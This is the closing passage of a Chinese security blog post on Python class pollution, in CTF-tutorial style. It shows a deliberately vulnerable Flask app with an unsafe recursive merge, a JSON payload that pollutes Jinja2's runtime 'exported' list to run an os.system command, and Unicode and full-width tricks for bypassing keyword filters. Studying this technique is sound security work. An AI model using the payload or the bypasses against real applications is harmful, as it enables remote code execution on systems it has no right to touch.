+<p>该逻辑会向输出流写入一段拼接的代码（输出流中代码最终会被编译进而执行），注意其中的<code>exported_names</code>变量，该变量为<code>.runtime</code>模块（即<code>Lib/site-packages/jinja2/runtime.py</code>）中导入的变量<code>exported</code>和<code>async_exported</code>组合后得到，这就意味着我们可以通过污染<code>.runtime</code>模块中这两个变量实现RCE。由于这段逻辑是模板文件解析过程中必经的步骤之一，所以这就意味着只要渲染任意的文件均能通过污染这两属性实现RCE。</p>
+<p>给出模拟的环境如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;#templates/index.html#&#125;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;nt here~&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>app.py</p>
+<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>进行<code>RCE</code>将<code>flag</code>写入<code>static</code>目录中</p>
+<h6 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h6><p>这是windows执行的移动文件的命令，linux做适当修改</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;__loader__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;copy .\\\\flag .\\\\static\\\\flag&#x27;);#&quot;</span><span class="punctuation">]</span></span><br><span class="line">                  <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>但是需要注意插入<code>payload</code>的位置是AST的根部分，是作为模板编译时的处理代码的一部分，同样受到模板缓存的影响，也就是说这里插入的<code>payload</code><strong>只会在模板在第一次访问时触发，所以请在模板加载之前进行注入</strong></p>
+<p>然后就能在<code>static</code>目录下读取到<code>flag</code>了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240112001153809.png"
+                      alt="image-20240112001153809"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240112001211302.png"
+                      alt="image-20240112001211302"
+                ></p>
+<h2 id="关键字过绕过"><a href="#关键字过绕过" class="headerlink" title="关键字过绕过"></a>关键字过绕过</h2><h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h3><p>如：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__init__</span><br><span class="line">\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="全角半角"><a href="#全角半角" class="headerlink" title="全角半角"></a>全角半角</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗</span><br><span class="line">𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵</span><br><span class="line">０１２３４５６７８９</span><br><span class="line">𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻</span><br><span class="line">𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡</span><br><span class="line">＿</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> Python 原型链污染</li>
+        <li><strong>作者:</strong> Ko1sh1</li>
+        <li><strong>创建于
+                :</strong> 2023-12-25 07:11:34</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2024-05-30 22:13:51
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://ko1sh1.github.io/2023/12/25/blog_python原型链污染/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/python-%E6%BC%8F%E6%B4%9E/">#python 漏洞</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/02/08/blog_%E5%90%89%E6%9E%97%E7%9C%81%E7%AC%AC%E4%B8%89%E8%BD%AE%E8%81%94%E8%B5%9B-Web/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">吉林省高校网络安全联赛第三轮 Web 官方题解</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/10/02/blog_Redis%E5%AE%89%E5%85%A8/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Redis 安全</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div class="twikoo-container">
+        <script data-swup-reload-script
+                src='https://cdn.staticfile.org/twikoo/1.6.31/twikoo.all.min.js'
+        ></script>
+        <div id="twikoo-comment"></div>
+        <script data-swup-reload-script>
+            function loadTwikoo() {
+                twikoo.init({
+                    el: '#twikoo-comment',
+                    envId: 'https://ko1sh1-blog-comments.hf.space',
+                });
+            }
+
+            if ('true') {
+                const loadTwikooTimeout = setTimeout(() => {
+                    loadTwikoo();
+                    clearTimeout(loadTwikooTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadTwikoo);
+            }
+        </script>
+    </div>
+
+
+        
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">Python 原型链污染</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%88%E5%B9%B6%E5%87%BD%E6%95%B0"><span class="nav-text">合并函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B1%A1%E6%9F%93%E5%B0%9D%E8%AF%95"><span class="nav-text">污染尝试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B1%9E%E6%80%A7"><span class="nav-text">修改自定义属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7"><span class="nav-text">修改内置属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E6%B3%95%E6%B1%A1%E6%9F%93%E7%9A%84Object"><span class="nav-text">无法污染的Object</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E5%B9%BF%E6%B3%9B%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="nav-text">更广泛的获取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%8E%B7%E5%8F%96"><span class="nav-text">全局变量获取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%B2%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97%E8%8E%B7%E5%8F%96"><span class="nav-text">已加载模块获取</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%99%85%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E5%90%88%E5%B9%B6%E5%87%BD%E6%95%B0"><span class="nav-text">实际环境中的合并函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E9%9D%A2%E6%89%A9%E5%B1%95"><span class="nav-text">攻击面扩展</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0%E5%BD%A2%E5%8F%82%E9%BB%98%E8%AE%A4%E5%80%BC"><span class="nav-text">替换函数形参默认值</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#defaults"><span class="nav-text">__defaults__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#kwdefaults"><span class="nav-text">__kwdefaults__</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E5%AE%9A%E5%80%BC%E6%9B%BF%E6%8D%A2"><span class="nav-text">特定值替换</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#os-environ%E8%B5%8B%E5%80%BC"><span class="nav-text">os.environ赋值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flask%E7%9B%B8%E5%85%B3%E7%89%B9%E5%AE%9A%E5%B1%9E%E6%80%A7"><span class="nav-text">flask相关特定属性</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E7%BB%95%E8%BF%87"><span class="nav-text">关键字过绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Unicode"><span class="nav-text">Unicode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%A8%E8%A7%92%E5%8D%8A%E8%A7%92"><span class="nav-text">全角半角</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ko1sh1</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共 14 篇文章
+                    </span>
+                    
+                        <span>
+                            共 128.2k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
